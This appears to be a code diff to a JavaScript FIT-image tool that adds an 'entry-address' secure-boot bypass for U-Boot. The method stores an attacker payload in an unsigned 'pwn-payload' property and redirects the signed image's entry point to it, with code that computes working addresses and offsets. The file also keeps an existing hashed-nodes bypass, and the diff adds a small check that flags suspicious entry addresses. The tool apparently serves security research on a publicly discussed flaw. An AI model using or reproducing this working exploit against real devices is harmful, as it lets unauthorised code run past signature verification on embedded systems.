@@ -64,6 +64,64 @@ const FitOps = (() => {
   }
 
   /**
+   * Read a load/entry address off an image node.  FIT writes them as
+   * #address-cells big-endian words, so four or eight bytes; anything else is
+   * not an address this tool is going to reason about.
+   */
+  function readAddress(node, name) {
+    const data = FDT.getProperty(node, name);
+    if (!data || (data.byteLength !== 4 && data.byteLength !== 8)) return null;
+    const dv = new DataView(data.buffer, data.byteOffset, data.byteLength);
+    return data.byteLength === 4
+      ? dv.getUint32(0)
+      : dv.getUint32(0) * 0x100000000 + dv.getUint32(4);
+  }
+
+  /**
+   * A kernel_noload image is booted where it lies.  bootm replaces its load
+   * address with the position of the image data and takes entry as an offset
+   * from there, so neither property means what it does elsewhere.
+   */
+  function isNoload(node) {
+    return FDT.getStringProperty(node, 'type') === 'kernel_noload';
+  }
+
+  /**
+   * How many cells an address of this image node takes: what it already uses,
+   * else the FIT root's #address-cells, else one.
+   */
+  function addressCells(node, root) {
+    for (const name of ['entry', 'load']) {
+      const data = FDT.getProperty(node, name);
+      if (data && (data.byteLength === 4 || data.byteLength === 8)) return data.byteLength / 4;
+    }
+    const cells = FDT.getProperty(root, '#address-cells');
+    if (cells && cells.byteLength >= 4) {
+      const n = new DataView(cells.buffer, cells.byteOffset, 4).getUint32(0);
+      if (n === 1 || n === 2) return n;
+    }
+    return 1;
+  }
+
+  /**
+   * Encode an address into the given number of cells.
+   */
+  function addressBytes(value, cells) {
+    if (cells === 1 && value > 0xffffffff) {
+      throw new Error(`Address 0x${value.toString(16)} does not fit the single address cell this FIT uses`);
+    }
+    const data = new Uint8Array(cells * 4);
+    const dv = new DataView(data.buffer);
+    if (cells === 2) {
+      dv.setUint32(0, Math.floor(value / 0x100000000));
+      dv.setUint32(4, value % 0x100000000);
+    } else {
+      dv.setUint32(0, value);
+    }
+    return data;
+  }
+
+  /**
    * Validate a FIT image. Returns { valid, tree, images, error }.
    */
   function validate(buffer) {
@@ -105,7 +163,18 @@ const FitOps = (() => {
           isVAB = dv.getUint32(certOff, true) === 0x25D04E7F;
         }
       }
-      return { name: img.name, type, description: desc, size, compression, arch, isOrig, isX509, isVAB };
+      // load and entry are unverified in a per-image signing scheme, which is
+      // what the entry-address method lives off.  An entry that does not point
+      // into the image it belongs to is the symptom Rasmus Villemoes suggested
+      // checking for, so the table can show it -- except for kernel_noload,
+      // where entry is an offset and the comparison would mean nothing.
+      const load = readAddress(img, 'load');
+      const entry = readAddress(img, 'entry');
+      const entryEscapes = !isNoload(img) &&
+        entry !== null && load !== null && size > 0 &&
+        (entry < load || entry >= load + size);
+      return { name: img.name, type, description: desc, size, compression, arch,
+        isOrig, isX509, isVAB, load, entry, entryEscapes };
     });
 
     const desc = FDT.getStringProperty(tree.root, 'description') || '';
@@ -373,12 +442,16 @@ const FitOps = (() => {
    *   hashed-nodes  Move the signed image into an orig- container, redirect
    *                 the signature's hashed-nodes list at the copy and leave
    *                 the patched node in its place, where lookups find it.
+   *   entry-address Leave the signed image completely alone, carry the payload
+   *                 in an extra property of its node and point the image's
+   *                 entry at it.  For FITs signed with required = "image",
+   *                 where the signature covers the data and nothing else.
    *   sanity-check  Patch the signed image where it stands and touch nothing
    *                 else.  The signature keeps covering data that no longer
    *                 matches it, so verification must fail: this is the
    *                 negative control, not a bypass.
    */
-  const METHODS = ['hashed-nodes', 'sanity-check'];
+  const METHODS = ['hashed-nodes', 'entry-address', 'sanity-check'];
 
   function methodOf(opts) {
     const method = (opts && opts.method) || METHODS[0];
@@ -409,6 +482,142 @@ const FitOps = (() => {
   }
 
   /**
+   * Property the entry-address payload travels in, next to the image whose
+   * entry points at it.  The name is deliberately obvious: this one is not
+   * hiding from anybody, it is riding along in plain sight because nothing
+   * verifies it.
+   */
+  const PAYLOAD_PROP = 'pwn-payload';
+
+  /**
+   * Properties through which a configuration names an image.
+   */
+  const CONFIG_IMAGE_PROPS = [
+    'kernel', 'fdt', 'ramdisk', 'firmware', 'setup', 'loadables', 'fpga', 'script',
+  ];
+
+  /**
+   * Images covered by a configuration signature, by node name.
+   *
+   * Reading hashed-nodes is not enough to answer this.  U-Boot stopped
+   * trusting that property in 2092322b31cc ("boot: Add
+   * fit_config_get_hash_list()", v2026.04-rc4) and now rebuilds the signed
+   * node list from the configuration's own image references, so a FIT whose
+   * hashed-nodes was stripped still verifies -- and still notices an image
+   * node that changed.  The references are therefore what decides, and
+   * hashed-nodes is consulted on top for bootloaders that do read it.
+   */
+  function configSignedImages(tree) {
+    const covered = new Set();
+    const configsNode = FDT.findNode(tree.root, ['configurations']);
+    if (!configsNode) return covered;
+
+    for (const conf of configsNode.children) {
+      const signatures = conf.children.filter(c => c.name.startsWith('signature'));
+      if (signatures.length === 0) continue;
+
+      for (const prop of CONFIG_IMAGE_PROPS) {
+        for (const name of FDT.getStringListProperty(conf, prop) || []) covered.add(name);
+      }
+
+      for (const sig of signatures) {
+        for (const path of FDT.getStringListProperty(sig, 'hashed-nodes') || []) {
+          const image = /^\/images\/([^/]+)$/.exec(path);
+          if (image) covered.add(image[1]);
+        }
+      }
+    }
+    return covered;
+  }
+
+  /**
+   * The address the FIT itself is loaded at -- bootm's own argument, not any
+   * image's load address.  Accepts a number or the text the UI field holds.
+   */
+  function fitLoadAddress(opts) {
+    const raw = opts && opts.fitLoadAddress;
+    const value = typeof raw === 'string' ? Number(raw.trim() || NaN) : raw;
+    if (typeof value !== 'number' || !Number.isSafeInteger(value) || value < 0) {
+      throw new Error('The entry-address method needs the address the FIT itself is ' +
+        'loaded at, e.g. 0x82000000');
+    }
+    return value;
+  }
+
+  /**
+   * Signature bypass via the unverified entry point.
+   *
+   * With required = "image" the signature covers the image's data property and
+   * nothing else.  load, entry and anything else the image node carries stay
+   * outside it, so the payload never has to displace the signed data: it
+   * travels in a property of its own beside it and entry is moved onto it.
+   * The bootloader verifies the vendor's kernel, copies it to load, and then
+   * jumps into the attacker's bytes.
+   *
+   * Rasmus Villemoes demonstrated this on a BeagleBone Black in
+   * https://lore.kernel.org/u-boot/87h5quqqln.fsf@prevas.dk/ -- a thunk pasted
+   * into the FIT with fdtput, entry moved onto it, bootm happy -- and argued
+   * that required = "image" "offers no protection at all" next to a hole like
+   * that.  Bounds-checking entry against [load, load+size) would only force
+   * the attacker to find a useful instruction inside the signed image instead.
+   *
+   * The payload's address is not known until the blob has been serialized, so
+   * entry gets a placeholder of the right width here and placeEntryPoints()
+   * fills it in once the layout is final.
+   */
+  function entryBypassSignature(targetNode, newData, root) {
+    const payload = newData instanceof Uint8Array ? newData : new Uint8Array(newData);
+    FDT.setProperty(targetNode, PAYLOAD_PROP, payload);
+    FDT.setProperty(targetNode, 'entry', addressBytes(0, addressCells(targetNode, root)));
+  }
+
+  /**
+   * Resolve the entry addresses entryBypassSignature() left as placeholders.
+   *
+   * Serialize once to see where each payload property landed, add the address
+   * the FIT is loaded at, write the entries and serialize again.  The second
+   * pass lays the blob out identically -- entry keeps the width the first pass
+   * gave it -- so the offsets still hold, and the size is checked rather than
+   * trusted.
+   */
+  function placeEntryPoints(tree, base) {
+    const imagesNode = FDT.findNode(tree.root, ['images']);
+    const targets = imagesNode.children.filter(img => FDT.getProperty(img, PAYLOAD_PROP));
+    const draft = FDT.serialize(tree);
+
+    for (const img of targets) {
+      const offset = FDT.propertyOffset(draft, ['images', img.name], PAYLOAD_PROP);
+      if (offset === null) throw new Error(`Lost the payload of '${img.name}' while serializing`);
+
+      let value;
+      if (isNoload(img)) {
+        /*
+         * A kernel_noload image is never copied anywhere, so its entry is not
+         * an address at all: bootm overwrites load with where the data already
+         * sits and adds that to entry (images.ep += images.os.image_start).
+         * What belongs in the property is therefore the distance from the data
+         * to the payload, and the FIT's own load address cancels out.
+         */
+        const dataOffset = FDT.propertyOffset(draft, ['images', img.name], 'data');
+        if (dataOffset === null) throw new Error(`Image '${img.name}' has no data to offset from`);
+        value = offset - dataOffset;
+      } else {
+        if (base === null) throw new Error('No load address to place the entry point against');
+        value = base + offset;
+      }
+
+      FDT.setProperty(img, 'entry',
+        addressBytes(value, FDT.getProperty(img, 'entry').byteLength / 4));
+    }
+
+    const out = FDT.serialize(tree);
+    if (out.byteLength !== draft.byteLength) {
+      throw new Error('FIT layout moved while the entry points were being placed');
+    }
+    return out;
+  }
+
+  /**
    * Signature bypass: clone original node, replace data, redirect signatures.
    *
    * Each bypassed image gets its own container node placed immediately after
@@ -416,8 +625,10 @@ const FitOps = (() => {
    * nodes, which is critical because fdt_find_regions walks the FDT linearly
    * and the concatenated hash input must match the original region order.
    *
-   * The sanity-check method skips all of that and patches the signed node
-   * itself, leaving the signature to fail over data it no longer matches.
+   * The other two methods skip all of that: entry-address leaves the signed
+   * node's contents alone and only moves its entry, and sanity-check patches
+   * the signed node itself, leaving the signature to fail over data it no
+   * longer matches.
    */
   async function bypassSignature(tree, targetNodeName, newData, opts) {
     const method = methodOf(opts);
@@ -428,6 +639,19 @@ const FitOps = (() => {
     // Find target node
     const targetNode = imagesNode.children.find(c => c.name === targetNodeName);
     if (!targetNode) throw new Error(`Image node '${targetNodeName}' not found`);
+
+    if (method === 'entry-address') {
+      // entry lives in the image node, so a configuration signature covers it
+      // and moving it would break that digest for nothing.  That FIT wants the
+      // hashed-nodes method; this one is for required = "image".
+      if (configSignedImages(tree).has(targetNodeName)) {
+        throw new Error(`/images/${targetNodeName} is covered by a configuration ` +
+          'signature, whose digest includes the entry property. The entry-address ' +
+          'method applies to FITs signed with required = "image"');
+      }
+      entryBypassSignature(targetNode, newData, tree.root);
+      return;
+    }
 
     if (method === 'sanity-check') {
       await patchImageNode(targetNode, newData, opts);
@@ -487,6 +711,28 @@ const FitOps = (() => {
 
     const tree = result.tree;
     const u8buf = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);
+    const method = methodOf(options);
+
+    // Redirecting the entry point is all the entry-address method does: every
+    // signed image keeps its contents, so there is no variant of it that
+    // rewrites a device tree or grows a ramdisk.  Refuse those combinations
+    // here rather than handing back a FIT whose signatures quietly fail.
+    let base = null;
+    if (method === 'entry-address') {
+      if (options.changeDtModel || options.appendInitramfs) {
+        throw new Error('The entry-address method only moves the entry point: it cannot ' +
+          'change the DT model or append an initramfs, which would break the signature ' +
+          'over the image data');
+      }
+      if (!options.replaceKernel || !options.kernelData) {
+        throw new Error('The entry-address method needs a payload: enable the kernel replacement');
+      }
+      // Only an image that gets copied to a load address needs one: for
+      // kernel_noload the entry is an offset and the address cancels out.
+      if (findAllKernelImages(tree).some(img => !isNoload(img))) {
+        base = fitLoadAddress(options);
+      }
+    }
 
     // Resolve any external data references
     FDT.resolveExternalData(tree.root, u8buf);
@@ -546,6 +792,10 @@ const FitOps = (() => {
       }
     }
 
+    if (method === 'entry-address') {
+      return placeEntryPoints(tree, base);
+    }
+
     return FDT.serialize(tree);
   }
 
@@ -555,6 +805,7 @@ const FitOps = (() => {
     crc32,
     sha256,
     METHODS,
+    PAYLOAD_PROP,
     findFdtImage,
     findKernelImage,
     findRamdiskImage,
